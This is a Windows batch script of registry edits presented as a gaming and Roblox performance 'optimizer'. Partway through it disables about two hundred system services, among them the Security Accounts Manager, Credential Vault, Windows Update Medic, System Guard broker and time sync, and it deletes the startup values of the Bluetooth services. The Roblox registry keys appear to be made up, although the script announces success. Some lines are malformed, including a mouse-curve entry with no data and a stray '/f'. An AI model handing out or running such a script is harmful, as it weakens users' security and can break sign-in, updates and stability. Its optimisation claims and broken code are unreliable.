Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Keyboard" /v "KeyboardSpeed" /t REG_SZ /d "31" /f
Reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "SmoothMouseXCurve" /t REG_BINARY /d "0000000000000000156e000000000000004001000000000029dc0300000000000000280000000000" /f >nul 2>&1
Reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d "0000000000000000fd11010000000000002404000000000000fc12000000000000c0bb0100000000" /f >nul 2>&1
Reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "0" /f >nul 2>&1
Reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold1" /t REG_SZ /d "0" /f >nul 2>&1
Reg add "HKEY_USERS\.DEFAULT\Control Panel\Mouse" /v "MouseThreshold2" /t REG_SZ /d "0" /f >nul 2>&1
Reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "MouseSensitivity" /t REG_SZ /d "10" /f >nul 2>&1
Reg add "HKEY_CURRENT_USER\Control Panel\Mouse" /v "SmoothMouseYCurve" /t REG_BINARY /d 
Reg.exe add "HKU\.DEFAULT\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "100" /f
echo.

cls
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
cls
echo Optimizing Roblox for better performance and enhanced visuals...
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v GraphicsMode /t REG_DWORD /d 10 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v ParticleQuality /t REG_DWORD /d 2 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v ShadowQuality /t REG_DWORD /d 2 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v TextureQuality /t REG_DWORD /d 2 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v RenderDistance /t REG_DWORD /d 500 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v PostProcessingEnabled /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v AmbientOcclusionEnabled /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v DepthOfFieldEnabled /t REG_DWORD /d 0 /f
cls
echo Adjusting mouse settings for improved responsiveness...
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v MouseSensitivity /t REG_DWORD /d 10 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v MouseAccelerationEnabled /t REG_DWORD /d 0 /f
cls
echo Enhancing audio experience...
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v AudioMode /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v AudioQuality /t REG_DWORD /d 2 /f
cls
echo Applying additional optimizations...
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v FogEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v LightQuality /t REG_DWORD /d 2 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v ReflectionsEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v DynamicShadowsEnabled /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v DynamicLightingEnabled /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Roblox\RobloxPlayer\Settings" /v DynamicReflectionsEnabled /t REG_DWORD /d 0 /f
cls
echo All optimizations applied successfully!
cls
reg add "HKCU\Control Panel\Desktop" /v "JPEGImportQuality" /t "REG_DWORD" /d "100" /f
cls
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects" /v "VisualFXSetting" /t REG_DWORD /d "3" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled" /v "DefaultApplied" /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing" /v "DefaultApplied" /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations" /v "DefaultApplied" /t REG_SZ /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon" /v "DefaultApplied" /t REG_SZ /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation" /v "DefaultApplied" /t REG_SZ /d "0" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AarSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AJRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ALG" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Appinfo" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppMgmt" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppReadiness" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppVClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppXSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AssignedAccessManagerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AudioEndpointBuilder" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Audiosrv" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\autotimesvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AxInstSV" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d "4" /f
cls
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\BluetoothUserService" /v "Start" /f


reg add "HKLM\SYSTEM\CurrentControlSet\Services\BrokerInfrastructure" /v "Start" /t REG_DWORD /d "2" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\BTAGService" /v "Start" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\BthAvctpSvc" /v "Start" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bthserv" /v "Start" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\camsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CaptureService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cbdhsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "2" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ClipSVC" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CoreMessagingRegistrar" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CredentialEnrollmentManagerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CscService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DcomLaunch" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationBrokerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationService" /v "Start" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceInstall" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicePickerUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicesFlowUserSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevQueryBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dhcp" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DispBrokerDesktopSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DisplayEnhancementService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DmEnrollmentSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushservice" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DoSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dot3svc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DusmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Eaphost" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EFS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\embeddedmode" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EntAppSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventSystem" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\fdPHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FDResPub" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache3.0.0.0" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FrameServer" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\GraphicsPerfSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\hidserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\HvHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\icssvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IKEEXT" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\InstallService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\iphlpsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\IpxlatCfgSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KeyIso" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\KtmRm" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LicenseManager" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lltdsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lmhosts" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LSM" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LxpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MessagingService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mpssvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\msiserver" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NaturalAuthentication" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcbService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcdAutoSetup" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netman" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\netprofm" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetSetupSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcCtnrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nsi" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2pimsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2psvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PeerDistSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PerfHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PhoneSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PlugPlay" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPAutoReg" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PolicyAgent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Power" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PrintWorkflowUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ProfSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PushToInstall" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasAuto" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasMan" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcSs" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SamSs" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCardSvr" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ScDeviceEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Schedule" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCPolicySvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SDRSVC" /v "Start" /t REG_DWORD /d "4" /f
/f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SENS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorDataService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SessionEnv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ShellHWDetection" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\shpamsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\smphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SmsRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\sppsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SSDPSRV" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SstpSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StateRepository" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StorSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\svsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\swprv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SystemEventsBroker" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TapiSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Themes" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TieringEngineService" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TokenBroker" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TroubleshootingSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrustedInstaller" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UdkUserSvc" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UevAgentService" /v "Start" /t REG_DWORD /d "4" /f

reg add "HKLM\SYSTEM\CurrentControlSet\Services\upnphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserManager" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vds" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VSS" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WalletService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WarpJITSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wbengine" /v "Start" /t REG_DWORD /d "4" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wcmsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WEPHOSTSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wercplsupport" /v "Start" /t REG_DWORD /d "4" /f
